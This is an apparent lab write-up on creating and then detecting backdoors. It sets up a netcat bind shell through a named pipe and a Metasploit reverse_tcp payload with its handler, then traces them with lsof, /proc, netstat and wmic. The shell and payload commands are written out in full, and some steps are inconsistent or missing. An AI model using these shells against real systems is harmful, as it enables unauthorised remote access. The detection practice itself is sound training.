# Detecting and Analyzing a Backdoor

Firstly, I used mknod to create a named pipe (First In, First Out - FIFO) which is used for inter-process communication between processes.

After creating the named pipe, I created the backdoor. The way this worked is that:
```bash
mknod backpipe 2
/bin/bash 0<backpipe2 | nc -nlvp 2222 1>backpipe2
```
This command listens on port 2222 for incoming connections.
After creating the backdoor, I connected to the listening port of the backdoor on port 2222 to establish access.

Moving on to the second stage, I used lsof to list open files and processes. This tool helps detect all listening and established process connections.

Identifying the PID

In the output, I located the Process ID (PID) of the backdoor. The image below shows this process information, confirming that the backdoor is active.
![image](https://github.com/user-attachments/assets/d84c219a-a599-4a5f-ba8e-0455574d0dd1)

Inspecting the Process

Once I identified the PID, I navigated into its /proc directory to inspect its files and directories:
This revealed various files, including:
cwd (current working directory)
cmdline (command-line arguments used to start the process)
fd/ (file descriptors used by the process)
By analyzing these files, I gained insight into how the backdoor was executed and maintained.

Discovering Suspicious Executable

From the result of lsof, I found an interesting .exe file. To analyze its contents. This revealed that the netcat connection was being used to listen for connections through the backdoor.

Creating a Reverse Shell with Metasploit

To escalate access, I created a backdoor and a listener to establish a reverse TCP connection back to the attacking (Windows) machine. This allows remote access using Metasploit.

Steps to Set Up the Reverse Shell:

Generate a payload using msfvenom:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > backdoor.exe
![image](https://github.com/user-attachments/assets/b124f241-a39e-4813-aa4a-312b261b8ebe)

Transfer the backdoor.exe file to the target system. For the .exe file to be accessible on Windows/WSL, I copied it into:

/mnt/c/tools/

Start the Metasploit framework and set up a listener:
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT 4444
exploit

Once executed on the target system, this provides remote meterpreter access to the compromised system.
Checking Network Connections
Since the malware is now up and running, I performed some basic network connection checks using:
netstat -naob
This command provides details on:
TCP/UDP connections
Port numbers
Process IDs (PIDs)
Connection status (Established or Listening)
![image](https://github.com/user-attachments/assets/7cfc225d-6f90-42e9-a7e3-f171e0c9f88e)
![image](https://github.com/user-attachments/assets/f73a450f-087a-4bae-904b-fa4dec67171e)

By analyzing this output, I was able to confirm the backdoor’s active connection and further validate its presence on the system.

Checking for Scheduled Tasks and Process Analysis

To investigate further, I checked for scheduled tasks associated with the attacker's process. This helps determine if the payload is set to execute repeatedly:
This command displays running processes related to the identified PID, revealing any persistent backdoor mechanisms.

Lastly, I ran the following command to examine process details:
wmic process get name, parentprocessid, processid
![image](https://github.com/user-attachments/assets/556fd8aa-4739-4fc9-9cd2-463aa65674f1)

This launched the .exe file and successfully identified the malware, confirming its execution path and parent process details.

